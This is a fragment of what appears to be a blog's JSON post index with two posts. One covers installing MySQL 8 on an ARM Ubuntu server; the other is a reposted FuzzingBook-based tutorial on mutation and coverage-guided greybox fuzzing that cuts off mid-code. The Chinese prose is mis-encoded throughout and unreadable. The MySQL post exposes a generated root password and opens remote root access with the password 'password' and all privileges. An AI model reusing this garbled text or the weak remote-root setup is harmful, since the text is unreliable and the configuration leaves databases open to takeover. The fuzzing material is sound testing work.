ä¸ºé²²é¹æœåŠ¡å™¨ä¸‹MySQL8çš„å®‰è£…ä¸ä½¿ç”¨/","link":"","permalink":"https://mundi-xu.github.io/2021/03/10/%E5%8D%8E%E4%B8%BA%E9%B2%B2%E9%B9%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8BMySQL8%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","excerpt":"åœ¨åä¸ºé²²é¹å­¦ç”ŸæœºUbuntu 20.04.2 LTS (GNU/Linux 4.15.0-136-generic aarch64)ä¸Šé…ç½®å®‰è£…MySQL8","text":"Dockerå®‰è£… Docker Version: 20.10.5Site: https://hub.docker.com/r/mysql/mysql-serverUbuntu 20.04.2 LTS (GNU/Linux 4.15.0-136-generic aarch64) Dockerçš„å®‰è£…å°±è·³è¿‡äº†ï¼Œç›´æ¥å¿«è¿›åˆ°mysql-serverçš„å®‰è£…ï¼Œå¥½æ¶ˆæ¯æ˜¯mysqlå®˜æ–¹Dockerå·²ç»é€‚é…äº†arm64æ¶æ„ï¼Œæ‰€ä»¥ç›´æ¥å‚ç…§å®˜æ–¹æ–‡æ¡£å®‰è£…å°±å¯ä»¥äº†ã€‚ 12345678docker pull mysql/mysql-server # é»˜è®¤é€‰æ‹©latestdocker run --name=mysql1 -d mysql/mysql-serverdocker ps # ç­‰å¾…åˆå§‹åŒ–å®Œæˆï¼Œstartingå˜ä¸ºhealthydocker logs mysql1 # ç›‘æ§å®¹å™¨è¾“å‡ºdocker logs mysql1 2&gt;&amp;1 | grep GENERATED # åˆå§‹åŒ–å®ŒæˆåæŸ¥çœ‹å¯†ç GENERATED ROOT PASSWORD: Axegh3kAJyDLaRuBemecis&amp;EShOs # ç”Ÿæˆçš„éšæœºå¯†ç docker exec -it mysql1 mysql -uroot -p # è¾“å…¥ä¸Šé¢ç”Ÿæˆçš„éšæœºå¯†ç ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;; # ä¿®æ”¹rootå¯†ç  åŒ…ç®¡ç†å™¨å®‰è£… mysql Ver 8.0.23-0ubuntu0.20.04.1 for Linux on aarch64 ((Ubuntu)) æ›´æ–°æºï¼Œå®‰è£…ä¾èµ– 1234sudo apt-get install mysql-serversudo apt install mysql-clientsudo apt install libmysqlclient-devsudo mysql # æŸ¥çœ‹æ˜¯å¦æˆåŠŸ MySQLé…ç½®mysqlå®‰è£…å®Œæˆåé»˜è®¤æ˜¯æ²¡æœ‰å¯†ç çš„,éœ€è¦å…ˆä¿®æ”¹å¯†ç  1alter user &#39;root&#39;@&#39;localhost&#39; identified by &quot;password&quot;; è¿œç¨‹è¿æ¥éœ€è¦å•ç‹¬é…ç½® 123sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf# æ³¨é‡Šæ‰bind-address= 127.0.0.1 æˆ–æ”¹ä¸º0.0.0.0sudo service mysql restart # é‡å¯MySQLæœåŠ¡ æ·»åŠ è¿œç¨‹è¿æ¥çš„è´¦å· 123create user root@&#39;%&#39; identified by &#39;password&#39;;grant all privileges on *.* to root@&#39;%&#39;;flush privileges; æœ€ååœ¨åä¸ºECSçš„å®‰å…¨ç»„é…ç½®ä¸­å¼€å¯3306ç«¯å£å°±å¯ä»¥è¿œç¨‹è¿æ¥äº†ã€‚","categories":[],"tags":[{"name":"arm64","slug":"arm64","permalink":"https://mundi-xu.github.io/tags/arm64/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://mundi-xu.github.io/tags/Ubuntu/"},{"name":"MySQL","slug":"MySQL","permalink":"https://mundi-xu.github.io/tags/MySQL/"}]},{"title":"ã€è½¬è½½ã€‘Fuzzingå…¥å‘ç³»åˆ—-Part1","slug":"Fuzzingå…¥å‘ç³»åˆ—-Part1","date":"2021-03-05T07:30:58.000Z","updated":"2021-03-12T09:59:08.684Z","comments":false,"path":"2021/03/05/Fuzzingå…¥å‘ç³»åˆ—-Part1/","link":"","permalink":"https://mundi-xu.github.io/2021/03/05/Fuzzing%E5%85%A5%E5%9D%91%E7%B3%BB%E5%88%97-Part1/","excerpt":"è®°å½•ä¸€ä¸ªå…³äºå…¥å‘fuzzingçš„å­¦ä¹ å†ç¨‹","text":"æœ¬æ–‡ç”±RGDZåŸåˆ›å‘å¸ƒhttps://www.anquanke.com/post/id/232185 å‰è¨€:æœ€è¿‘å•ƒäº†FuzzingBookï¼Œç„¶åè®°å½•ä¸€ä¸ªå…³äºå…¥å‘fuzzingçš„å­¦ä¹ å†ç¨‹ Fuzzingç®€ä»‹ï¼šé¦–å…ˆæ˜¯å…³äºè½¯ä»¶æµ‹è¯•ï¼š è½¯ä»¶æµ‹è¯•ä¸»è¦æ˜¯ä¸‰ç§æ–¹å¼ï¼š æ‰‹å·¥æµ‹è¯• åŠè‡ªåŠ¨åŒ–æµ‹è¯• è‡ªåŠ¨åŒ–æµ‹è¯• ä½œè€…è§‰å¾—Fuzzingæ˜¯ä¸€ç§ä»‹äºè‡ªåŠ¨åŒ–å’ŒåŠè‡ªåŠ¨åŒ–çš„æµ‹è¯•æ–¹æ³• å…¶æ ¸å¿ƒæ€æƒ³æ˜¯è‡ªåŠ¨æˆ–åŠè‡ªåŠ¨çš„ç”Ÿæˆéšæœºæ•°æ®è¾“å…¥åˆ°ä¸€ä¸ªç¨‹åºä¸­ï¼Œå¹¶ç›‘è§†ç¨‹åºå¼‚å¸¸ï¼Œå¦‚å´©æºƒï¼Œæ–­è¨€(assertion)å¤±è´¥ï¼Œä»¥å‘ç°å¯èƒ½çš„ç¨‹åºé”™è¯¯ï¼Œæ¯”å¦‚å†…å­˜æ³„æ¼ã€‚æ¨¡ç³Šæµ‹è¯•å¸¸å¸¸ç”¨äºæ£€æµ‹è½¯ä»¶æˆ–è®¡ç®—æœºç³»ç»Ÿçš„å®‰å…¨æ¼æ´ã€‚ â€”â€”ç»´åŸºç™¾ç§‘:æ¨¡ç³Šæµ‹è¯• å°±Fuzzingæ¥è¯´ï¼Œæ¨¡ç³Šæµ‹è¯•ä¸»è¦æœ‰ä¸¤ä¸ªé‡è¦çš„æ¨¡å—ç»„æˆFuzzerå’ŒRunner ä¸‹é¢æ˜¯å…¶ç±»å›¾ï¼š ä¸€ä¸ªå¾ˆç®€å•çš„è°ƒç”¨å…³ç³»æ¥è¿›è¡Œç®€å•çš„åŒ…è£…ï¼ŒRunnerç±»ä¸»è¦è´Ÿè´£å°†æ•°æ®è¾“å…¥ç¨‹åºï¼Œä»¥åŠç›‘æ§ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ï¼Œè¿™æ¬¡æˆ‘ä»¬å…ˆé‡ç‚¹ä»‹ç»Fuzzer Fuzzerå¯¹äºæ¨¡ç³Šæµ‹è¯•æ¥è¯´ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹å°±æ˜¯å¯¹æ•°æ®è¿›è¡Œæ¨¡ç³Šå¤„ç†ï¼Œæ‰€ä»¥ä¸€èˆ¬åœ¨å®ç°ä¸Šéƒ½ä¼šå•ç‹¬æŠŠFuzzeræ¨¡å—æŠ½ç¦»å‡ºæ¥ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯¹äºæ•°æ®å˜å¼‚å¸¸ç”¨çš„ä¸‰ç§åŸºç¡€çš„æ–¹å¼æ˜¯éšæœºåˆ é™¤ï¼Œéšæœºæ·»åŠ ï¼Œ**éšæœºåè½¬(filp)**ï¼Œä¸‹é¢æ˜¯ç®€å•çš„å®ç°ä»£ç ï¼Œæˆ‘ä»¬åç»­çš„å·¥ä½œä¹Ÿæ˜¯åŸºäºå…¶æ¥è¿›è¡Œçš„æ„å»º 123456789101112131415161718def del_random_chr(s): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)) return s[:pos]+s[pos+1:] def insert_random_chr(s): pos = random.randint(0, len(s)) new_s = chr(random.randrange(32, 127)) return s[:pos]+new_s+s[pos:] def flip_random_chr(s): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)-1) bit = 1&lt;&lt;random.randint(0, 6) return s[:pos]+chr(ord(s[pos])^bit)+s[pos+1:] ä¸ºäº†è·Ÿå®Œå–„ä¸€ç‚¹ï¼Œåœ¨fuzzingbookä¸­ï¼Œä½œè€…å°†å…¶åŒ…è£…æˆä¸€ä¸ªç±» 123456789101112131415161718192021222324252627282930313233class Mutator(object): def __init__(self): self.mutators = [ self.del_random_chr, self.insert_random_chr, self.flip_random_chr ] def del_random_chr(self, s:str): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)) return s[:pos]+s[pos+1:] def insert_random_chr(self, s:str): pos = random.randint(0, len(s)) new_s = chr(random.randrange(32, 127)) return s[:pos]+new_s+s[pos:] def flip_random_chr(self, s:str): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)-1) bit = 1&lt;&lt;random.randint(0, 6) return s[:pos]+chr(ord(s[pos])^bit)+s[pos+1:] def mutate(self, s): mutator = random.choice(self.mutators) return mutator(s) åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œä¸»è¦æ˜¯åŒ…è£…æ•°æ®è¿›è¡ŒåŸºç¡€å˜å¼‚å¤„ç†çš„ä¸€äº›æ–¹æ³•ï¼Œè¿˜ä¸èƒ½æˆä¸ºFuzzer ä¸‹é¢æ˜¯ä¸€ä¸ªFuzzerçš„åŸºç±» 12345678910111213141516class Fuzzer(object): def __init__(self): pass def fuzz(self): return &quot;&quot; def run(self, runner:Runner=Runner()): return runner.run(inp=self.fuzz()) def runs(self, runner:Runner=PrintRunner(), trials=10): outcomes = [self.run(runner) for i in range(trials)] return outcomes åŸºç±»çš„æ„å»ºä¸»è¦æ˜¯ä¸ºäº†Runnerå’ŒFuzzerè”ç³»èµ·æ¥ï¼Œå¯ä»¥çœ‹è§å…¶ä»…ä»…æä¾›åŸºç¡€çš„runæ–¹æ³•ï¼Œä¸»è¦æ˜¯å°†æˆ‘ä»¬è¿›è¡Œfuzzå¤„ç†åçš„æ•°æ®è¾“å…¥åˆ°Runneré‡Œé¢å»ï¼Œç”±Runnerä¼ é€’ç»™æˆ‘ä»¬Targetç¨‹åº æœ‰äº†ä¸Šé¢çš„åŸºç¡€éƒ¨ä»¶ï¼Œæˆ‘ä»¬ä¸‹é¢å°±èƒ½å¤Ÿå®ç°ä¸€ä¸ªç®€å•çªå˜Fuzzer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class Seed(object): def __init__(self, data): self.data = data def __str__(self): return self.data __repr__ = __str__class PowerSchedule(object): def assignEnergy(self, population): for seed in population: seed.energy = 1 def normalizedEnergy(self, population): energy = list(map(lambda seed: seed.energy, population)) sum_energy = sum(energy) norm_energy = list(map(lambda nrg: nrg/sum_energy, energy)) return norm_energy def choose(self, population): self.assignEnergy(population) norm_energy = self.normalizedEnergy(population) seed = np.random.choice(population, p=norm_energy) return seedclass MutationFuzzer(Fuzzer): def __init__(self, seeds, mutator, schedule): self.seeds = seeds self.mutator = mutator self.schedule = schedule self.inputs = [] self.reset() def reset(self): self.population = list(map(lambda x: Seed(x), self.seeds)) self.seed_idx = 0 def create_candidate(self): seed:Seed = self.schedule.choose(self.population) candidate = seed.data trials = min(len(candidate), 1 &lt;&lt; random.randint(1, 5)) for i in range(trials): candidate = self.mutator.mutate(candidate) return candidate def fuzz(self): if self.seed_idx &lt; len(self.seeds): self.inp = self.seeds[self.seed_idx] self.seed_idx += 1 return self.inp self.inp = self.create_candidate() self.inputs.append(self.inp) return self.inp Seedç±»ä¸»è¦æ˜¯ä¸ºäº†å¯¹ç§å­æ•°æ®è¿›è¡Œä¸€äº›åŒ…è£…ï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿèµ‹äºˆç§å­æ•°æ®ä¸€äº›ç›¸å…³æ•°æ®ï¼Œæ–¹ä¾¿æˆ‘ä»¬åç»­å¯¹æ•°æ®çš„å¤„ç† PowerScheduleç±»ç›¸å½“äºä¸€ä¸ªè°ƒåº¦è¡¨ï¼Œä¸»è¦ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡ç§å­æ•°æ®çš„æƒçº§å…³ç³»æ¥å¼•å¯¼åç»­æ•°æ®çš„ç”Ÿæˆï¼Œç®€å•ç‚¹è¯´ï¼Œå°±æ˜¯å¯¹ç§å­æ•°æ®çš„æƒé‡è¿›è¡Œç®¡ç† ç›¸å¯¹æ ¸å¿ƒçš„MutationFuzzerç±»ï¼Œå…¶ç»§æ‰¿äºFuzzeråŸºç±»ï¼ŒåŒæ—¶èƒ½å°†æˆ‘ä»¬çš„æ‰€ç»™ç§å­æ•°æ®è¿›è¡Œçªå˜æ¨¡ç³Š æµ‹è¯•ä»£ç : 1234seed_input = &quot;http://www.google.com/search?q=fuzzing&quot;mutation_fuzzer = MutationFuzzer(seeds=[seed_input], mutator=Mutator(), schedule=PowerSchedule())for i in range(10): print(mutation_fuzzer.fuzz()) è¾“å‡º: 1234567891011$&gt; python3 mutator_test.pyhttp://www.google.com/search?q=fuzzinghttp:/ww.gooc:le.co/earcH?q&lt;nuzinYght#tp!://ww7.gogle&amp;com/seamrch?q=cfuozzingzLIhtp:/www.g1oogxencOm/bpsgarch?qw=fuzzinght+t[r/www.google.com/search?1=furzng`ttq:3/7wg.goggne&gt;com/sarch?=uuzinwhttp://www.google.com[/search?q=fuzzing;http://www.g%oogl.c`omd-se]rc?qfi9ohtp:/cww.qgoglg.coi/search?pfuzajghttp:/+www.eoogle.coe/ search?q=fuzzing ç¡®å®å°†æ•°æ®è¿›è¡Œäº†æ¨¡ç³Šå¤„ç†ï¼Œä½†å…¶ä¼¼ä¹å¤ªå‘æ•£äº†ï¼ŒåŸºæœ¬ä¸åœ¨æˆ‘ä»¬å¯æ§èŒƒå›´å†…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è€ƒè™‘ä¸€ç§æ–¹æ¡ˆï¼Œå…¶èƒ½å¤Ÿå¼•å¯¼æˆ‘ä»¬çš„Fuzzeræ¥ç”Ÿæˆæ•°æ®ï¼Œç›¸å½“äºä¸€ç§å…·æœ‰å¼•å¯¼æ€§çš„Fuzzerï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å­¦ä¹ ä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼šCode Coverage(ä»£ç è¦†ç›–ç‡) Code Coverage: ä»£ç è¦†ç›–ï¼ˆè‹±è¯­ï¼šCode coverageï¼‰æ˜¯è½¯ä»¶æµ‹è¯•ä¸­çš„ä¸€ç§åº¦é‡ï¼Œæè¿°ç¨‹åºä¸­æºä»£ç è¢«æµ‹è¯•çš„æ¯”ä¾‹å’Œç¨‹åº¦ï¼Œæ‰€å¾—æ¯”ä¾‹ç§°ä¸ºä»£ç è¦†ç›–ç‡ã€‚ â€”â€”ç»´åŸºç™¾ç§‘:ä»£ç è¦†ç›–ç‡ å…³äºä»£ç è¦†ç›–ç‡ï¼Œå…¶å®é¡¾åæ€ä¹‰ï¼Œè¯´ç®€å•äº†ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œèƒ½å¤Ÿè®©ç¨‹åºçš„é‚£äº›ä»£ç å¾—å€’æ‰§è¡Œä»¥åŠå…¶æ‰§è¡Œçš„æ¬¡æ•°ï¼ŒåŒ…æ‹¬å…¶æ‰§è¡Œæ¬¡æ•°å æ€»æ•°çš„ä¸€ä¸ªæ¯”ä¾‹ã€‚ åœ¨FuzzingBookä¸­ï¼Œå…¶ä½œè€…ä¸¾äº†ä¸€ä¸ªğŸŒ°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384/* CGI decodeing as c program */#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#define DEBUG 0typedef unsigned int bool;bool true = 1;bool false = 0;int hex_values[256];#define HEX_VALUES_LENGTH sizeof(hex_values)/sizeof(int)void init_hex_values() &#123; for (int i = 0; i &lt; HEX_VALUES_LENGTH; i++) &#123; hex_values[i] = -1; &#125; for (char i=&#x27;0&#x27;; i&lt;=&#x27;9&#x27;; i++) &#123; hex_values[i] = i-&#x27;0&#x27;; &#125; for (char i=&#x27;a&#x27;; i&lt;=&#x27;f&#x27;; i++) &#123; hex_values[i] = i-&#x27;a&#x27;+0xa; &#125; for (char i=&#x27;A&#x27;; i&lt;=&#x27;F&#x27;; i++) &#123; hex_values[i] = i-&#x27;A&#x27;+0xA; &#125;&#125;bool cgi_decode(char *s, char *t) &#123; while (*s!=&#x27;\\0&#x27;) &#123; switch (*s) &#123; case &#x27;+&#x27;: *t++ = &#x27; &#x27;; break; case &#x27;%&#x27;: &#123; int dight_high = *++s; int dight_low = *++s; if (hex_values[dight_high]&lt;0 &amp;&amp; hex_values[dight_low]&lt;0) &#123; return false; &#125; *t++ = (hex_values[dight_high]&lt;&lt;4) + hex_values[dight_low]; &#125; break; default: *t++ = *s; break; &#125; s++; &#125; *t = &#x27;\\0&#x27;; return true;&#125;int main(int argc, char const *argv[])&#123; init_hex_values();// #if DEBUG// for (int i=0; i&lt;HEX_VALUES_LENGTH; i++) &#123;// printf(&quot;%c:0x%x\\n&quot;, i, hex_values[i]);// &#125;// #endif if (argc&gt;=2) &#123; char* s = (char*)argv[1]; char* t = malloc(strlen(s)+1); bool ret = cgi_decode(s, t); printf(&quot;%s\\n&quot;, t); return ret; &#125; printf(&quot;cgi_decode: usage: cgi_decode STRING\\n&quot;); return 0;&#125; ç»ˆç«¯: 123456$&gt; gcc cgi_decode.c --coverage -o cgi_decode$&gt; ./cgi_decode &#x27;Send+mail+to+me%40fuzzingbook.org&#x27;$&gt; gcov cgi_decode.cFile &#x27;cgi_decode.c&#x27;Lines executed:92.86% of 42cgi_decode.c:creating &#x27;cgi_decode.c.gcov&#x27; ç„¶ååœ¨ç”Ÿæˆçš„.c.gcovæ–‡ä»¶ä¸­å¦‚å›¾æ‰€ç¤º æœ€å·¦è¾¹å°±æ˜¯æ¯ä¸€è¡Œä»£ç æ‰§è¡Œåˆ°çš„æ¬¡æ•° å¯¹äºpythonä»£ç ï¼Œä½œè€…æ„å»ºäº†ä¸€ä¸ªCoverageç±»æ¥è®°å½•ä»£ç è¦†ç›–ç‡: 12345678910111213141516171819202122232425262728class Coverage(object): def traceit(self, frame, event, arg): if self.original_trace_function is not None: self.original_trace_function(frame, event, arg) if event == &quot;line&quot;: function_name = frame.f_code.co_name lineno = frame.f_lineno self._trace.append((function_name, lineno)) return self.traceit def __init__(self): self._trace = [] def __enter__(self): self.original_trace_function = sys.gettrace() sys.settrace(self.traceit) return self def __exit__(self, exc_type, exc_value, tb): sys.settrace(self.original_trace_function) def trace(self): return self._trace def coverage(self): return set(self.trace()) è¿™æ ·çš„è¯å°±å¯ä»¥é€šè¿‡è¿™ä¸ªCoverageç±»æ¥ä½¿ç”¨withè¯­å¥æ¥è®°å½•ä»£ç è¦†ç›–ç‡ æµ‹è¯•ä»£ç : 1234with Coverage() as cov: cgi_decode(&quot;a+b&quot;) print(cov.coverage()) ç»ˆç«¯: 12$&gt; python3 coverage_test.py&#123;(&#x27;cgi_decode&#x27;, 24), (&#x27;cgi_decode&#x27;, 30), (&#x27;cgi_decode&#x27;, 43), (&#x27;cgi_decode&#x27;, 33), (&#x27;cgi_decode&#x27;, 23), (&#x27;__exit__&#x27;, 38), (&#x27;cgi_decode&#x27;, 32), (&#x27;cgi_decode&#x27;, 45), (&#x27;cgi_decode&#x27;, 29), (&#x27;cgi_decode&#x27;, 25), (&#x27;cgi_decode&#x27;, 22), (&#x27;cgi_decode&#x27;, 28), (&#x27;cgi_decode&#x27;, 44), (&#x27;cgi_decode&#x27;, 31), (&#x27;cgi_decode&#x27;, 21), (&#x27;cgi_decode&#x27;, 34)&#125; äº†è§£ä»£ç è¦†ç›–ç‡ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä»£ç è¦†ç›–ç‡ï¼Œæ¥å¼•å¯¼æˆ‘ä»¬çš„Fuzzeræ¥ç”Ÿæˆæ•°æ®ï¼Œç›¸å½“äºä¸€ç§å…·æœ‰å¼•å¯¼æ€§çªå˜çš„Fuzzerï¼Œæˆ‘ä»¬ç§°ä¸ºGreyboxFuzzerï¼Œä¸‹é¢æ˜¯å®ç°è¿™ä¸ªç±»çš„ä»£ç  12345678910111213141516class GreyboxFuzzer(MutationFuzzer): def reset(self): super().reset() self.coverages_seen = set() self.population = [] def run(self, runner: Runner): result, outcome = super().run(runner=runner) new_coverage = frozenset(runner.coverage()) if new_coverage not in self.coverages_seen: seed = Seed(self.inp) seed.coverage = runner.coverage() self.coverages_seen.add(new_coverage) self.population.append(seed) return (result, outcome) åœ¨MutationCoverageFuzzerç±»çš„Runæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å®é™…ä¸Šè‡³å°‘æ¯”è¾ƒäº†æ¯ä¸€æ¬¡Runneræ‰§è¡Œåçš„ï¼Œå…¶è¾“å…¥çš„æ•°æ®æ˜¯å¦è®©ç¨‹åºæ‰§è¡Œåˆ°æ–°çš„ä»£ç å—ï¼Œå¦‚æœæœ‰åˆ™è®°å½•ä¸‹æ¥ï¼ŒåŒæ—¶å°†è¿™ä¸€æ¬¡çš„æ•°æ®åŠ å…¥åˆ°è¿›è¡Œå¸…é€‰åˆ°ç§å­åˆ—è¡¨ä¸­ï¼Œä½œä¸ºä¸‹æ¬¡çªå˜çš„æ•°æ®ç§å­ï¼Œè¿™æ ·å°±æœ‰æœºä¼šè®©æˆ‘ä»¬Fuzzerç”Ÿæˆå‡ºæ¥çš„æ•°æ®èƒ½å¤Ÿå¹¿çš„ä»£ç è¦†ç›–ç‡ã€‚ ä¸‹é¢æ˜¯MutationFuzzerå’ŒGreyboxFuzzerçš„æµ‹è¯•å¯¹æ¯”, ä¾ç„¶ä½¿ç”¨FuzzingBookä¸­çš„æµ‹è¯•ä¾‹å­ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ğŸŒ° Targetç¨‹åºä»£ç : 123456def crashme (s): if len(s) &gt; 0 and s[0] == &#x27;b&#x27;: if len(s) &gt; 1 and s[1] == &#x27;a&#x27;: if len(s) &gt; 2 and s[2] == &#x27;d&#x27;: if len(s) &gt; 3 and s[3] == &#x27;!&#x27;: raise Exception() MutationFuzzeræµ‹è¯•ä»£ç : 123456789101112seed_input = &quot;good&quot;blackbox_fuzzer = MutationFuzzer([seed_input], Mutator(), PowerSchedule())n = 30000 # æµ‹è¯•æ¬¡æ•°blackbox_runner = FunctionCoverageRunner(crashme)with Timer() as t: blackbox_fuzzer.runs(blackbox_runner, trials=n)all_cov, greybox_coverage = population_coverage(blackbox_fuzzer.inputs, crashme)print(t.elapsed_time())print(all_cov)print(max(greybox_coverage)) ç»ˆç«¯: 1234$&gt; python3 mutator_test.py1.489651209&#123;(&#x27;crashme&#x27;, 3), (&#x27;__exit__&#x27;, 38), (&#x27;crashme&#x27;, 2)&#125;3 GreyboxFuzzeræµ‹è¯•ä»£ç  1234567891011121314seed_input = &quot;good&quot;n = 30000greybox_fuzzer = GreyboxFuzzer([seed_input], Mutator(), PowerSchedule())runner = FunctionCoverageRunner(crashme)with Timer() as t: greybox_fuzzer.runs(runner, trials=n)all_cov, greybox_coverage = population_coverage(greybox_fuzzer.inputs, crashme)print(t.elapsed_time())# print(runner.coverage())print(all_cov)print(max(greybox_coverage))print(greybox_fuzzer.population) ç»ˆç«¯ï¼š 12345$&gt; python3 greyboxFuzzer.py1.7056656000000001&#123;(&#x27;crashme&#x27;, 3), (&#x27;crashme&#x27;, 6), (&#x27;crashme&#x27;, 2), (&#x27;crashme&#x27;, 5), (&#x27;crashme&#x27;, 4), (&#x27;__exit__&#x27;, 38)&#125;6[good, bEgd, bar$Egdi, badEdi, bad!Egi] ä¸‹é¢æ˜¯FuzzingBookæ‰€ç»™å‡ºçš„ä¸€å¼ å¯¹æ¯”å›¾ï¼Œå¯ä»¥ç›´è§‚çš„å‘ç°ï¼Œæ²¡æœ‰ä»£ç è¦†ç›–ç‡å¼•å¯¼çš„æ™®é€šæ•°æ®å˜å¼‚å¾ˆéš¾è¦†ç›–å®Œç¨‹åºçš„è·¯å¾„ï¼Œè€Œé€šè¿‡ä»£ç è¦†ç›–ç‡çš„å¼•å¯¼ï¼ŒFuzzerç”Ÿæˆçš„æ•°æ®èƒ½é€æ¸çš„è¦†ç›–ç¨‹åºçš„è·¯å¾„ã€‚ AFLFastSchedule:åœ¨æˆ‘ä»¬Fuzz crashmeè¿™ä¸ªä¾‹å­ä¸­ï¼Œé€šè¿‡ä¸ŠèŠ‚çš„å®éªŒæˆ‘ä»¬å¯ä»¥å‘ç°ä½¿ç”¨ä»£ç è¦†ç›–ç‡æ¥å¼•å¯¼æˆ‘ä»¬çš„Fuzzerï¼Œå¯ä»¥ä½¿å…¶å˜å¾—æ›´æœ‰ç›®çš„æ€§çš„å»ç”Ÿæˆå˜å¼‚æ•°æ®ï¼Œä½†å…¶è€—æ—¶è¿˜æ˜¯ç›¸å¯¹è¾ƒé•¿ï¼Œä¸”fuzzingå‡ºæ¥çš„çš„æ•°æ®ä¹Ÿç›¸å¯¹è¾ƒå¤šï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¼˜åŒ–çš„æ–¹æ¡ˆå‘¢ï¼Ÿ åœ¨FuzzingBookä¸­ï¼Œä½œè€…ä½¿ç”¨å¦‚ä¸‹å…¬å¼æ¥è®¡ç®—ç§å­æ•°æ®çš„æƒé‡ e(s) =\\frac{1}{f(p(s))^e} å®é™…ä¸Šå¾ˆå®¹æ˜“ç†è§£: sæ˜¯ç§å­ï¼Œä½œä¸ºä¸€ä¸ªå‚æ•° å‡½æ•°pç”¨æ¥è·å–è¯¥ç§å­æ‰€è¦†ç›–çš„è·¯å¾„hashå€¼ å‡½æ•°fç”¨æ¥è·å–è¯¥è·¯å¾„å·²ç»è¢«ç§å­è¦†ç›–çš„æ¬¡æ•° eæ˜¯ä¸€ä¸ªæŒ‡æ•°å¸¸é‡ï¼Œç”¨æ¥æ‰©å¤§æ•°é‡çº§ï¼Œé€šè¿‡è°ƒæ•´è¿™ä¸ªeçš„å¸¸é‡å€¼ï¼Œæˆ‘ä»¬èƒ½å‡å°‘fuzzçš„æ¬¡æ•°, æ¥æå‡fuzzerçš„æ•ˆç‡ AFLFastScheduleç±»å®ç°ä»£ç : 12345678class AFLFastSchdule(PowerSchedule): def __init__(self, exponent): self.exponent = exponent self.path_frequency = &#123;&#125; def assignEnergy(self, population:List[Seed]): for seed in population: seed.energy = 1 / (self.path_frequency[getPathID(seed.coverage)] ** self.exponent) AFLFastScheduleç±»ç»§æ‰¿PowerScheduleï¼Œé‡å†™äº†assignEnergyæ–¹æ³•ï¼Œé‡æ–°é€šè¿‡ä¸Šè¯‰å…¬å¼æ¥è®¡ç®—ç§å­çš„æƒé‡ CountGreyboxFuzzerç±»å®ç°ä»£ç : 12345678910111213141516class CountingGreyboxFuzzer(GreyboxFuzzer): def __init__(self, seeds, mutator: Mutator, schedule: AFLFastSchdule): super().__init__(seeds, mutator, schedule) self.schedule = schedule def reset(self): return super().reset() def run(self, runner: Runner): result, outcome = super().run(runner) path_id = getPathID(runner.coverage()) if path_id not in self.schedule.path_frequency: self.schedule.path_frequency[path_id] = 1 return result, outcome self.schedule.path_frequency[path_id] += 1 return result, outcome CountGreyboxFuzzerç±»ç»§æ‰¿GreyboxFuzzerï¼Œä¸»è¦é‡å†™runæ–¹æ³•ï¼Œå°†æ£€æµ‹ä»£ç è·¯å¾„æ˜¯å¦å·²è¢«æ‰§è¡Œæ›¿æ¢ä¸ºå¢åŠ è·¯å¾„å·²æ‰§è¡Œæ¬¡æ•°ï¼Œç›¸æ¯”è¾ƒåŸæ¥çš„æ™®é€šgreyboxFuzzerï¼Œè¿™æ ·å½“ä¸‹ä¸€æ¬¡ç§å­è°ƒåº¦å™¨åœ¨å¸…é€‰ç§å­æ—¶ï¼Œå°±æœ‰æƒé‡å˜åŒ–äº†ã€‚ é€šè¿‡å…¬å¼çš„æè¿°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å½“ä¸€ä¸ªè·¯å¾„è¢«è¦†ç›–å¤šæ¬¡æ—¶ï¼Œä»–çš„æƒé‡ä¼šå‡å°‘ï¼Œè€Œè¾ƒæ–°çš„è·¯å¾„çš„æƒé‡åè€Œæ›´å¤§ï¼Œè€Œç›®å‰æˆ‘ä»¬çš„ç§å­è°ƒåº¦å™¨å¸…é€‰ç§å­ä¸»è¦ä¾èµ–å…¶æƒé‡ï¼Œé‚£ä¹ˆè¿™å°±ç›¸å½“äºç§å­è°ƒåº¦å™¨åœ¨å¸…é€‰ç§å­æ¥è¿›è¡Œå˜å¼‚æ—¶ï¼Œä¼šé€æ¸é€æ¸å¾€æ–°è·¯å¾„é€‰æ‹©ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ›´èƒ½å¼•å¯¼æˆ‘ä»¬çš„Fuzzerå»å˜å¼‚å‡ºä»£ç è¦†ç›–ç‡æ›´å¹¿çš„æ•°æ®ã€‚ ä¸‹é¢æ˜¯å®éªŒç»“æœï¼š Test_CountingGreyboxFuzzer: 1234567891011121314151617def test_countingGreyboxFuzzer(e): seed_input = &quot;good&quot; exponent = e n = 10000 fast_schedule = AFLFastSchdule(exponent) bostgreybox_fuzzer = CountingGreyboxFuzzer([seed_input], Mutator(), fast_schedule) runner = FunctionCoverageRunner(crashme) with Timer() as t: bostgreybox_fuzzer.runs(runner, trials=n) _, bostgreybox_coverage = population_coverage(bostgreybox_fuzzer.inputs, crashme) 